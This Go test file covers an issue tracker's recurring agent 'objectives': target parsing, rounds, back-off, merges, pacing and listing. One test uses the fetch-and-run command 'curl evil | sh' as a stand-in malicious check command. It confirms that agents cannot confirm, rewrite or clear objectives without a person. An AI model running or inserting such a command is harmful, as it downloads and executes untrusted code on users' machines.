package core

import (
	"errors"
	"fmt"
	"math"
	"strings"
	"testing"
	"time"
)

func TestParseObjectiveTarget(t *testing.T) {
	for _, c := range []struct {
		until, measure, better string
		want                   string // measure until op better unit, "" for an error
		target, factor         float64
	}{
		{"", "", "", " |||", 0, 0},
		{"pass", "", "", "pass|pass", 0, 0},
		{"", "pass", "", "pass|pass", 0, 0},
		{"< 1s", "", "", "time|< 1s|<|lower", 1, 0},
		{"<=250ms", "", "", "time|<= 250ms|<=|lower", 0.25, 0},
		{"< 2 min", "", "", "time|< 120s|<|lower", 120, 0},
		{">= 80%", "", "", "value|>= 80%|>=|higher|%", 80, 0},
		{"< 10 warnings", "", "", "value|< 10 warnings|<|lower|warnings", 10, 0},
		{"< 5 s", "value", "", "value|< 5 s|<|lower|s", 5, 0},
		{"2x", "", "", "time|2x||lower", 0, 2},
		{"1.5X", "value", "higher", "value|1.5x||higher", 0, 1.5},
		{"-10%", "", "", "time|-10%||lower", 0, 1 / 0.9},
		{"-50%", "value", "", "value|-50%||lower", 0, 2},
		{"+5%", "", "", "value|+5%||higher", 0, 1.05},
		{"1x", "", "", "", 0, 0},
		{"-100%", "", "", "", 0, 0},
		{"+5%", "time", "", "", 0, 0},
		{"< 1", "time", "", "", 0, 0},
		{"< 1s", "", "higher", "", 0, 0},
		{"2x", "pass", "", "", 0, 0},
		{"faster", "", "", "", 0, 0},
		{"2x", "time", "higher", "", 0, 0},
		{"pass", "time", "", "", 0, 0},
	} {
		tg, err := parseObjectiveTarget(c.until, c.measure, c.better)
		if c.want == "" {
			if !IsInvalid(err) {
				t.Errorf("%q %q %q: want invalid, got %+v, %v", c.until, c.measure, c.better, tg, err)
			}
			continue
		}
		if err != nil {
			t.Errorf("%q %q %q: %v", c.until, c.measure, c.better, err)
			continue
		}
		got := strings.TrimRight(strings.Join([]string{tg.measure, tg.until, tg.op, tg.better, tg.unit}, "|"), "|")
		if c.want == " |||" {
			if got != "" {
				t.Errorf("%q: got %q, want a loop", c.until, got)
			}
			continue
		}
		if got != c.want {
			t.Errorf("%q %q %q: got %q, want %q", c.until, c.measure, c.better, got, c.want)
		}
		if (c.target != 0) != (tg.target != nil) || (tg.target != nil && math.Abs(*tg.target-c.target) > 1e-9) {
			t.Errorf("%q: target %v, want %v", c.until, tg.target, c.target)
		}
		if (c.factor != 0) != (tg.factor != nil) || (tg.factor != nil && math.Abs(*tg.factor-c.factor) > 1e-9) {
			t.Errorf("%q: factor %v, want %v", c.until, tg.factor, c.factor)
		}
	}
}

func (a *apEnv) objective(key string, in ObjectiveInput) *Objective {
	a.t.Helper()
	o, err := a.s.SetObjective(a.ctx, a.admin, key, in)
	if err != nil {
		a.t.Fatal(err)
	}
	return o
}

func (a *apEnv) check(key string, in ObjectiveCheckInput) *ObjectiveCheck {
	a.t.Helper()
	res, err := a.s.RecordObjectiveCheck(a.ctx, a.ag, key, in)
	if err != nil {
		a.t.Fatal(err)
	}
	return res
}

// objRound takes the task by name and finishes it as an agent does.
func (a *apEnv) objRound(key string) *AgentResult {
	a.t.Helper()
	if _, err := a.s.AgentTake(a.ctx, a.ag, key, ""); err != nil {
		a.t.Fatal(err)
	}
	a.setClock(a.clockNow().Add(time.Minute))
	res, err := a.s.AgentDone(a.ctx, a.ag, key, AgentDoneInput{})
	if err != nil {
		a.t.Fatal(err)
	}
	return res
}

func (a *apEnv) waitReason(key string) string {
	a.t.Helper()
	q, err := a.s.AgentQueueFor(a.ctx, a.admin, "anthropic/claude-opus-5-5", "")
	if err != nil {
		a.t.Fatal(err)
	}
	for _, w := range q.Waiting {
		if w.Issue.Key == key {
			return w.Reason + ": " + w.Detail
		}
	}
	return ""
}

// "Until this runs in under a second": rounds that fall short leave the task
// open with what they gained; the round whose check meets it closes it.
func TestObjectiveUntilAFixedTarget(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Make the core tests fast", Agent: "claude"})
	o := a.objective(task.Key, ObjectiveInput{Check: ptrOf("go test ./internal/core"), Until: ptrOf("< 1s")})
	if o.State != ObjectiveActive || o.Kind != "until" || o.Measure != MeasureTime || o.Every != 0 || o.Round != 1 {
		t.Fatalf("objective = %+v", o)
	}
	if want := "until `go test ./internal/core` runs in under 1s"; o.Summary != want {
		t.Errorf("summary = %q, want %q", o.Summary, want)
	}

	// Round 1: faster than the base, still over a second.
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	res := a.check(task.Key, ObjectiveCheckInput{OK: true, Value: ptrOf(1.4), BaseOK: ptrOf(true), BaseValue: ptrOf(2.1), BaseSHA: "abc1234def", Runs: 7, P: ptrOf(0.002)})
	if res.Met || !res.Check.Improved || !strings.Contains(res.Message, "better, not met yet") || !strings.Contains(res.Message, "33% lower") {
		t.Fatalf("check = %+v %q", res.Check, res.Message)
	}
	a.setClock(a.clockNow().Add(time.Minute))
	done, err := a.s.AgentDone(a.ctx, a.ag, task.Key, AgentDoneInput{})
	if err != nil {
		t.Fatal(err)
	}
	if done.Finished || done.Status != "To Do" || !strings.Contains(done.Message, "open again for round 2") {
		t.Fatalf("done = %+v", done)
	}
	d := a.get(a.admin, task.Key)
	if d.Closed() || d.ClaimedBy != "" || d.Objective == nil || d.Objective.Round != 2 || d.Objective.NextAt != nil || len(d.Objective.Rounds) != 1 || d.Objective.Rounds[0].Outcome != RoundProgress {
		t.Fatalf("after round 1: %s, objective %+v", d.Status.Name, d.Objective)
	}
	if got := a.nextKey(); got != task.Key {
		t.Fatalf("next = %q, want the objective's next round", got)
	}
	if !strings.Contains(d.Objective.Text, "Round 1: better, not met (1.4s") {
		t.Errorf("text = %q", d.Objective.Text)
	}

	// Round 2: a check from round 1 doesn't count for it; a new one that
	// meets the target closes the task.
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	if res := a.check(task.Key, ObjectiveCheckInput{OK: true, Value: ptrOf(0.8), BaseOK: ptrOf(true), BaseValue: ptrOf(1.4), Runs: 7, P: ptrOf(0.002)}); !res.Met || res.Check.Round != 2 {
		t.Fatalf("check = %+v %q", res.Check, res.Message)
	}
	a.setClock(a.clockNow().Add(time.Minute))
	if done, err = a.s.AgentDone(a.ctx, a.ag, task.Key, AgentDoneInput{}); err != nil || !done.Finished {
		t.Fatalf("done = %+v, %v", done, err)
	}
	if d = a.get(a.admin, task.Key); !d.Closed() || d.Objective.State != ObjectiveMet || len(d.Objective.Rounds) != 2 {
		t.Fatalf("after round 2: %s, objective %+v", d.Status.Name, d.Objective)
	}
	if _, err := a.s.RecordObjectiveCheck(a.ctx, a.ag, task.Key, ObjectiveCheckInput{OK: true, Value: ptrOf(0.7)}); !IsInvalid(err) {
		t.Errorf("a check on a met objective: %v", err)
	}
}

// A round that moved nothing, or ended without a check, backs the task off,
// longer each time; taking it by name still works, and a round that gains
// starts over.
func TestObjectiveBacksOffWhenRoundsMoveNothing(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Coverage", Agent: "claude"})
	a.objective(task.Key, ObjectiveInput{Check: ptrOf("./coverage.sh"), Until: ptrOf(">= 80%")})

	if res := a.objRound(task.Key); res.Finished || !strings.Contains(res.Message, "not before") {
		t.Fatalf("done = %+v", res)
	}
	o := a.get(a.admin, task.Key).Objective
	if o.Stalled != 1 || o.NextAt == nil || o.NextAt.Sub(a.clockNow()) != time.Hour || o.Rounds[0].Outcome != RoundUnmeasured {
		t.Fatalf("after an unmeasured round: %+v", o)
	}
	if got := a.nextKey(); got != "" {
		t.Fatalf("next = %q while it backs off", got)
	}
	if why := a.waitReason(task.Key); !strings.HasPrefix(why, WaitObjective+": Round 2") {
		t.Errorf("queue says %q", why)
	}

	// By name it is taken all the same; a second round with no gain waits
	// twice as long.
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	if res := a.check(task.Key, ObjectiveCheckInput{OK: true, Value: ptrOf(61.0), BaseOK: ptrOf(true), BaseValue: ptrOf(61.0)}); res.Met || res.Check.Improved {
		t.Fatalf("check = %+v", res.Check)
	}
	a.setClock(a.clockNow().Add(time.Minute))
	if _, err := a.s.AgentDone(a.ctx, a.ag, task.Key, AgentDoneInput{}); err != nil {
		t.Fatal(err)
	}
	if o = a.get(a.admin, task.Key).Objective; o.Stalled != 2 || o.NextAt.Sub(a.clockNow()) != 2*time.Hour {
		t.Fatalf("after two: %+v", o)
	}
	a.setClock(a.clockNow().Add(2*time.Hour + time.Minute))
	if got := a.nextKey(); got != task.Key {
		t.Fatalf("next = %q once the wait is over", got)
	}

	// A round that gains clears it.
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	a.check(task.Key, ObjectiveCheckInput{OK: true, Value: ptrOf(70.0), BaseOK: ptrOf(true), BaseValue: ptrOf(61.0)})
	if _, err := a.s.AgentDone(a.ctx, a.ag, task.Key, AgentDoneInput{}); err != nil {
		t.Fatal(err)
	}
	if o = a.get(a.admin, task.Key).Objective; o.Stalled != 0 || o.NextAt != nil || o.Round != 4 {
		t.Fatalf("after a gain: %+v", o)
	}
}

// "Twice as fast, every round" is never met for good: a round that meets it
// still leaves the task open, a day apart by default, until a person closes
// it.
func TestObjectiveEachRoundNeverEnds(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Faster search", Agent: "claude"})
	o := a.objective(task.Key, ObjectiveInput{Check: ptrOf("./bench-search"), Until: ptrOf("2x")})
	if o.Kind != "each" || o.Every != 24*3600 {
		t.Fatalf("objective = %+v", o)
	}
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	// Without a base there is nothing to be twice as fast as.
	if res := a.check(task.Key, ObjectiveCheckInput{OK: true, Value: ptrOf(0.4), Runs: 7}); res.Met {
		t.Fatalf("met without a base: %+v", res.Check)
	}
	res := a.check(task.Key, ObjectiveCheckInput{OK: true, Value: ptrOf(0.4), BaseOK: ptrOf(true), BaseValue: ptrOf(1.0), Runs: 7, P: ptrOf(0.001)})
	if !res.Met || !strings.Contains(res.Message, "met for this round") {
		t.Fatalf("check = %+v %q", res.Check, res.Message)
	}
	a.setClock(a.clockNow().Add(time.Minute))
	done, err := a.s.AgentDone(a.ctx, a.ag, task.Key, AgentDoneInput{})
	if err != nil || done.Finished {
		t.Fatalf("done = %+v, %v", done, err)
	}
	o = a.get(a.admin, task.Key).Objective
	if o.State != ObjectiveActive || o.Round != 2 || o.Stalled != 0 || o.NextAt == nil || o.NextAt.Sub(a.clockNow()) != 24*time.Hour || o.Rounds[0].Outcome != RoundMet {
		t.Fatalf("after a met round: %+v", o)
	}
	// A timed change its runs can't tell from noise isn't a gain.
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	if res := a.check(task.Key, ObjectiveCheckInput{OK: true, Value: ptrOf(0.36), BaseOK: ptrOf(true), BaseValue: ptrOf(0.4), Runs: 7, P: ptrOf(0.4)}); res.Check.Improved {
		t.Fatalf("noise counted as a gain: %+v", res.Check)
	}
	// The person closes it themselves: that stands.
	done2 := "Done"
	if _, err := a.s.UpdateIssue(a.ctx, a.admin, task.Key, IssuePatch{Status: &done2}); err != nil {
		t.Fatal(err)
	}
	if d := a.get(a.admin, task.Key); !d.Closed() || d.Objective.State != ObjectiveEnded {
		t.Fatalf("after the person's close: %s, %+v", d.Status.Name, d.Objective)
	}
}

// A loop has no check: every round opens the task again until its rounds
// run out.
func TestObjectiveLoopRunsItsRounds(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Triage new bug reports", Agent: "claude"})
	o := a.objective(task.Key, ObjectiveInput{Every: ptrOf("0"), MaxRounds: ptrOf(2)})
	if o.Kind != "loop" || o.Every != 0 || o.MaxRounds != 2 {
		t.Fatalf("objective = %+v", o)
	}
	if res := a.objRound(task.Key); res.Finished || res.Status != "To Do" {
		t.Fatalf("round 1: %+v", res)
	}
	if got := a.nextKey(); got != task.Key {
		t.Fatalf("next = %q", got)
	}
	if res := a.objRound(task.Key); !res.Finished {
		t.Fatalf("round 2 of 2: %+v", res)
	}
	if d := a.get(a.admin, task.Key); !d.Closed() || d.Objective.State != ObjectiveEnded || len(d.Objective.Rounds) != 2 {
		t.Fatalf("after its rounds: %+v", d.Objective)
	}
	if _, err := a.s.SetObjective(a.ctx, a.admin, task.Key, ObjectiveInput{Check: ptrOf("true")}); !IsInvalid(err) {
		t.Errorf("an objective on a closed task: %v", err)
	}
}

// The merge of a round's pull request ends the round like wp done, and the
// merged pull request doesn't hold the next round back.
func TestObjectiveRoundEndsOnMerge(t *testing.T) {
	a := newAPEnv(t)
	a.s.Forges = newMemForge() // its GitHub links are refreshed, not from the real API (WP-1065)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Lint clean", Agent: "claude"})
	a.objective(task.Key, ObjectiveInput{Check: ptrOf("make lint"), Until: ptrOf("pass")})
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	if res := a.check(task.Key, ObjectiveCheckInput{OK: false, BaseOK: ptrOf(false)}); res.Met || res.Check.Line != "the command failed; base : fails" {
		t.Fatalf("check = %+v", res.Check)
	}
	const pr = "https://github.com/me/web/pull/7"
	l, err := a.s.AddLink(a.ctx, a.admin, task.Key, pr, "")
	if err != nil {
		t.Fatal(err)
	}
	a.s.Wait()
	a.setLinkState(l.ID, "merged")
	a.setClock(a.clockNow().Add(time.Minute))
	// What the "pull request merged" rule does, as an automation.
	rule := &Actor{User: a.admin.User, Automation: &Automation{ID: -1, ProjectID: a.p.ID, Name: "rule"}}
	done := "Done"
	if _, err := a.s.UpdateIssue(a.ctx, rule, task.Key, IssuePatch{Status: &done}); err != nil {
		t.Fatal(err)
	}
	d := a.get(a.admin, task.Key)
	if d.Closed() || d.Status.Category != CatTodo || d.Objective.Round != 2 || d.Objective.Rounds[0].PR != pr {
		t.Fatalf("after the merge: %s, %+v", d.Status.Name, d.Objective)
	}
	a.setClock(a.clockNow().Add(2 * time.Hour))
	if got := a.nextKey(); got != task.Key {
		t.Fatalf("next = %q", got)
	}
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	if pr := a.s.outOnPR(a.ctx, a.s.db.R, a.get(a.admin, task.Key).Issue); pr != nil {
		t.Errorf("round 2 is out on round 1's pull request: %+v", pr)
	}
	a.check(task.Key, ObjectiveCheckInput{OK: true, BaseOK: ptrOf(false)})
	a.setClock(a.clockNow().Add(time.Minute))
	if res, err := a.s.AgentDone(a.ctx, a.ag, task.Key, AgentDoneInput{}); err != nil || !res.Finished {
		t.Fatalf("done = %+v, %v", res, err)
	}
}

// An objective's check is a command agents' machines run, so an agent's is
// a proposal: shown, not run, not looping, until a person confirms it; and
// an agent can't change one in effect.
func TestObjectiveFromAnAgentIsAProposal(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Faster build", Agent: "claude"})
	o, err := a.s.SetObjective(a.ctx, a.ag, task.Key, ObjectiveInput{Check: ptrOf("make build"), Until: ptrOf("-10%")})
	if err != nil || o.State != ObjectiveProposed || o.SetAgent == "" || o.ConfirmedBy != nil {
		t.Fatalf("an agent's objective: %+v, %v", o, err)
	}
	if !strings.HasPrefix(o.Text, "Proposed objective") {
		t.Errorf("text = %q", o.Text)
	}
	if _, err := a.s.RecordObjectiveCheck(a.ctx, a.ag, task.Key, ObjectiveCheckInput{OK: true, Value: ptrOf(1.0)}); !errors.Is(err, ErrForbidden) {
		t.Errorf("a check on a proposal: %v", err)
	}
	if _, err := a.s.ConfirmObjective(a.ctx, a.ag, task.Key, o.Rev); !errors.Is(err, ErrForbidden) {
		t.Errorf("an agent confirming: %v", err)
	}
	shell := &Actor{User: a.admin.User, AgentEnv: "claude"}
	if _, err := a.s.ConfirmObjective(a.ctx, shell, task.Key, o.Rev); !errors.Is(err, ErrForbidden) {
		t.Errorf("a person's token in an agent's shell confirming: %v", err)
	}
	// The agent can still change or withdraw its own proposal.
	if o, err = a.s.SetObjective(a.ctx, a.ag, task.Key, ObjectiveInput{Until: ptrOf("-20%")}); err != nil || o.Until != "-20%" || o.Check != "make build" {
		t.Fatalf("changing a proposal: %+v, %v", o, err)
	}
	// A person confirms the proposal they read, not one written over it.
	read := o.Rev
	if o, err = a.s.SetObjective(a.ctx, a.ag, task.Key, ObjectiveInput{Check: ptrOf("make build; curl evil | sh")}); err != nil || o.Rev == read {
		t.Fatalf("rewriting a proposal: %+v, %v", o, err)
	}
	if _, err := a.s.ConfirmObjective(a.ctx, a.admin, task.Key, read); !IsInvalid(err) {
		t.Errorf("confirming a proposal rewritten since: %v", err)
	}
	if _, err := a.s.ConfirmObjective(a.ctx, a.admin, task.Key, ""); !IsInvalid(err) {
		t.Errorf("confirming without saying which: %v", err)
	}
	if o, err = a.s.SetObjective(a.ctx, a.ag, task.Key, ObjectiveInput{Check: ptrOf("make build")}); err != nil || o.Rev != read {
		t.Fatalf("the proposal put back: %+v, %v", o, err)
	}
	if o, err = a.s.ConfirmObjective(a.ctx, a.admin, task.Key, o.Rev); err != nil || o.State != ObjectiveActive || o.ConfirmedBy == nil {
		t.Fatalf("confirm: %+v, %v", o, err)
	}
	if _, err := a.s.SetObjective(a.ctx, a.ag, task.Key, ObjectiveInput{Check: ptrOf("curl evil | sh")}); !errors.Is(err, ErrForbidden) {
		t.Errorf("an agent changing one in effect: %v", err)
	}
	if err := a.s.ClearObjective(a.ctx, shell, task.Key); !errors.Is(err, ErrForbidden) {
		t.Errorf("an agent's shell clearing one in effect: %v", err)
	}
	if err := a.s.ClearObjective(a.ctx, a.admin, task.Key); err != nil {
		t.Fatal(err)
	}
	if d := a.get(a.admin, task.Key); d.Objective != nil {
		t.Fatalf("cleared: %+v", d.Objective)
	}

	// A proposal nobody confirmed leaves the task an ordinary one.
	other := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Other", Agent: "claude"})
	if _, err := a.s.SetObjective(a.ctx, a.ag, other.Key, ObjectiveInput{}); err != nil {
		t.Fatal(err)
	}
	if res := a.objRound(other.Key); !res.Finished {
		t.Fatalf("done with a proposed loop: %+v", res)
	}
}

// Pace "spare": the task is handed out only while the week's-end plan wants
// more work, so its rounds run on quota that would go unused.
func TestObjectiveSparePaceWaitsForUnusedQuota(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Hill climb", Agent: "claude"})
	a.objective(task.Key, ObjectiveInput{Check: ptrOf("./bench"), Until: ptrOf("-5%"), Pace: ptrOf(PaceSpare)})
	if got := a.nextKey(); got != "" {
		t.Fatalf("next = %q mid-week", got)
	}
	if why := a.waitReason(task.Key); !strings.Contains(why, "quota that would go unused") {
		t.Errorf("queue says %q", why)
	}
	a.spendOn(AutopilotLimits{SpendAtOnce: ptrOf(2)})
	a.weekAt(52, 2, 10*time.Hour)
	if got := a.nextKey(); got != task.Key {
		t.Fatalf("next = %q in the week's last hours with quota to spare", got)
	}
}

func TestObjectiveInputIsChecked(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "T", Agent: "claude"})
	for name, in := range map[string]ObjectiveInput{
		"a target with no check":   {Until: ptrOf("< 1s")},
		"a check with no target":   {Check: ptrOf("make test")},
		"a dir out of the repo":    {Check: ptrOf("make"), Until: ptrOf("pass"), Dir: ptrOf("../x")},
		"an unknown pace":          {Pace: ptrOf("fast")},
		"a bad every":              {Every: ptrOf("soon")},
		"setup for an untimed one": {Check: ptrOf("make"), Until: ptrOf("pass"), Setup: ptrOf("make deps")},
		"too many rounds":          {MaxRounds: ptrOf(5000)},
	} {
		if _, err := a.s.SetObjective(a.ctx, a.admin, task.Key, in); !IsInvalid(err) {
			t.Errorf("%s: %v", name, err)
		}
	}
	if _, err := a.s.GetObjective(a.ctx, a.admin, task.Key); !errors.Is(err, ErrNotFound) {
		t.Errorf("no objective: %v", err)
	}
	o := a.objective(task.Key, ObjectiveInput{Check: ptrOf("go test ./..."), Until: ptrOf("< 90s"), Dir: ptrOf("./internal/"), Setup: ptrOf("go build ./..."), Every: ptrOf("3d")})
	if o.Dir != "internal" || o.Every != 3*24*3600 || o.Setup != "go build ./..." {
		t.Fatalf("objective = %+v", o)
	}
	// Changing one field keeps the rest.
	if o = a.objective(task.Key, ObjectiveInput{Pace: ptrOf("spare")}); o.Until != "< 90s" || o.Check != "go test ./..." || o.Pace != PaceSpare || o.Every != 3*24*3600 {
		t.Fatalf("after a change: %+v", o)
	}
	list, err := a.s.ListObjectives(a.ctx, a.admin, a.p.Key, false)
	if err != nil || len(list) != 1 || list[0].Key != task.Key {
		t.Fatalf("list = %+v, %v", list, err)
	}
}

// A check is judged against the objective as it stands when the round
// ends: a target a person tightened since doesn't close the task on the old
// one, and a restarted objective doesn't count the checks it ended on.
func TestObjectiveJudgesChecksAgainstTheTargetAsItStands(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Fast report", Agent: "claude"})
	a.objective(task.Key, ObjectiveInput{Check: ptrOf("./report"), Until: ptrOf("< 2s")})
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	if r := a.check(task.Key, ObjectiveCheckInput{OK: true, Value: ptrOf(1.5), Runs: 5}); !r.Met {
		t.Fatalf("1.5s against < 2s: %+v", r)
	}
	a.objective(task.Key, ObjectiveInput{Until: ptrOf("< 1s")})
	if _, err := a.s.AgentDone(a.ctx, a.ag, task.Key, AgentDoneInput{}); err != nil {
		t.Fatal(err)
	}
	d := a.get(a.admin, task.Key)
	if d.Closed() || d.Objective.State != ObjectiveActive || d.Objective.Round != 2 {
		t.Fatalf("1.5s closed a task whose target is now < 1s: %s, %+v", d.Status.Name, d.Objective)
	}

	// Met, reopened by a person and started again: a new round, so the
	// check that met it doesn't close the task a second time.
	a.setClock(a.clockNow().Add(time.Minute))
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	a.check(task.Key, ObjectiveCheckInput{OK: true, Value: ptrOf(0.5), Runs: 5})
	if _, err := a.s.AgentDone(a.ctx, a.ag, task.Key, AgentDoneInput{}); err != nil {
		t.Fatal(err)
	}
	if d = a.get(a.admin, task.Key); !d.Closed() || d.Objective.State != ObjectiveMet {
		t.Fatalf("0.5s against < 1s: %s, %+v", d.Status.Name, d.Objective)
	}
	todo := "To Do"
	if _, err := a.s.UpdateIssue(a.ctx, a.admin, task.Key, IssuePatch{Status: &todo}); err != nil {
		t.Fatal(err)
	}
	if o := a.objective(task.Key, ObjectiveInput{}); o.State != ObjectiveActive || o.Round != 3 || o.Last != nil && o.Last.Round == o.Round {
		t.Fatalf("started again: %+v", o)
	}
	if a.objRound(task.Key); a.get(a.admin, task.Key).Closed() {
		t.Error("round 3 closed on round 2's check")
	}
}

// A change that leaves the target alone keeps it exactly, with its measure:
// the text kept for reading is rounded, and the web form sends it back.
func TestObjectiveKeepsItsTargetWhenAChangeLeavesItAlone(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Fast parse", Agent: "claude"})
	o := a.objective(task.Key, ObjectiveInput{Check: ptrOf("./parse"), Until: ptrOf("< 1.5ms")})
	if o = a.objective(task.Key, ObjectiveInput{Until: &o.Until, Pace: ptrOf(PaceSpare)}); o.Target == nil || math.Abs(*o.Target-0.0015) > 1e-12 {
		t.Errorf("target after a change of pace: %v (%s)", o.Target, o.Until)
	}
	other := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Smaller bundle", Agent: "claude"})
	o = a.objective(other.Key, ObjectiveInput{Check: ptrOf("./size"), Until: ptrOf("-10%"), Measure: ptrOf(MeasureValue)})
	if o = a.objective(other.Key, ObjectiveInput{Until: &o.Until, MaxRounds: ptrOf(5)}); o.Measure != MeasureValue || o.Better != "lower" {
		t.Errorf("after a change of rounds: measure %s, better %s", o.Measure, o.Better)
	}
	// A fixed target turned into one that never ends gets the day between rounds.
	if o = a.objective(task.Key, ObjectiveInput{Until: ptrOf("2x")}); o.Every != 86400 {
		t.Errorf("every = %v after turning endless", o.Every)
	}
}

// An agent can't end an objective in effect by cancelling its task: the
// cancel stands, the objective stays and goes on when a person reopens it.
func TestObjectiveSurvivesAnAgentsCancel(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Twice as fast", Agent: "claude"})
	a.objective(task.Key, ObjectiveInput{Check: ptrOf("./bench"), Until: ptrOf("2x")})
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	st := "canceled"
	if _, err := a.s.UpdateIssue(a.ctx, a.ag, task.Key, IssuePatch{Status: &st}); err != nil {
		t.Fatal(err)
	}
	if d := a.get(a.admin, task.Key); !d.Closed() || d.Objective.State != ObjectiveActive || d.Objective.Round != 1 {
		t.Fatalf("after an agent's cancel: %s, %+v", d.Status.Name, d.Objective)
	}
	todo := "To Do"
	if _, err := a.s.UpdateIssue(a.ctx, a.admin, task.Key, IssuePatch{Status: &todo}); err != nil {
		t.Fatal(err)
	}
	if res := a.objRound(task.Key); res.Finished {
		t.Error("reopened by a person, the round closed the task")
	}
	// A person's cancel ends it.
	if _, err := a.s.UpdateIssue(a.ctx, a.admin, task.Key, IssuePatch{Status: &st}); err != nil {
		t.Fatal(err)
	}
	if d := a.get(a.admin, task.Key); d.Objective.State != ObjectiveEnded {
		t.Errorf("after a person's cancel: %+v", d.Objective)
	}
}

// A second pull request from a round that already ended merges late: it
// ends nothing, since nobody has worked the round under way.
func TestObjectiveLateMergeFromAnEarlierRoundEndsNoRound(t *testing.T) {
	a := newAPEnv(t)
	a.s.Forges = newMemForge() // its GitHub links are refreshed, not from the real API (WP-1065)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Lint clean", Agent: "claude"})
	a.objective(task.Key, ObjectiveInput{Check: ptrOf("make lint"), Until: ptrOf("pass")})
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	urls := []string{"https://github.com/me/web/pull/7", "https://github.com/me/web/pull/8"}
	for _, u := range urls {
		if _, err := a.s.AddLink(a.ctx, a.admin, task.Key, u, ""); err != nil {
			t.Fatal(err)
		}
	}
	a.s.Wait()
	rule := &Actor{User: a.admin.User, Automation: &Automation{ID: -1, ProjectID: a.p.ID, Name: "rule"}}
	done := "Done"
	for n, u := range urls {
		a.setClock(a.clockNow().Add(time.Minute))
		if _, err := a.s.UpdateIssue(a.ctx, rule, task.Key, IssuePatch{Status: &done, ViaLink: u}); err != nil {
			t.Fatal(err)
		}
		if d := a.get(a.admin, task.Key); d.Closed() || d.Objective.Round != 2 || d.Objective.Stalled != 1 || len(d.Objective.Rounds) != 1 {
			t.Fatalf("after merge %d: %s, round %d, stalled %d, %d rounds", n+1, d.Status.Name, d.Objective.Round, d.Objective.Stalled, len(d.Objective.Rounds))
		}
	}
}

// A round ends in a workflow with no To Do status to open the task again
// in: the close stands, and the objective ends with that round recorded,
// rather than saying it opens again for a round that never comes.
func TestObjectiveEndsWhenTheWorkflowHasNoToDo(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Keep tidying", Agent: "claude"})
	a.objective(task.Key, ObjectiveInput{})
	if _, err := a.s.AgentTake(a.ctx, a.ag, task.Key, ""); err != nil {
		t.Fatal(err)
	}
	if _, err := a.s.db.W.ExecContext(a.ctx, `UPDATE statuses SET category = 'backlog' WHERE project_id = ? AND category = 'todo'`, a.p.ID); err != nil {
		t.Fatal(err)
	}
	a.setClock(a.clockNow().Add(time.Minute))
	if _, err := a.s.AgentDone(a.ctx, a.ag, task.Key, AgentDoneInput{}); err != nil {
		t.Fatal(err)
	}
	d := a.get(a.admin, task.Key)
	if !d.Closed() || d.Objective.State != ObjectiveEnded || d.Objective.Round != 1 || len(d.Objective.Rounds) != 1 {
		t.Fatalf("with no To Do: %s, %+v", d.Status.Name, d.Objective)
	}
}

// Objectives in projects the actor can't see don't crowd the ones they can
// out of the list.
func TestListObjectivesSkipsWhatTheActorCantSee(t *testing.T) {
	a := newAPEnv(t)
	old := objectiveListMost
	objectiveListMost = 2
	t.Cleanup(func() { objectiveListMost = old })
	bob := a.user("bob", false)
	mine := a.project(bob, "Mine", "")
	own := a.issue(bob, IssueInput{Project: mine.Key, Title: "Mine"})
	if _, err := a.s.SetObjective(a.ctx, bob, own.Key, ObjectiveInput{}); err != nil {
		t.Fatal(err)
	}
	for n := range 5 {
		a.setClock(a.clockNow().Add(time.Minute))
		task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: fmt.Sprint("Hidden ", n)})
		a.objective(task.Key, ObjectiveInput{})
	}
	list, err := a.s.ListObjectives(a.ctx, bob, "", false)
	if err != nil || len(list) != 1 || list[0].Key != own.Key {
		t.Fatalf("bob's list = %+v, %v", list, err)
	}
	if list, err = a.s.ListObjectives(a.ctx, a.admin, "", false); err != nil || len(list) != 2 {
		t.Fatalf("the admin's list holds at most 2: %d, %v", len(list), err)
	}
}
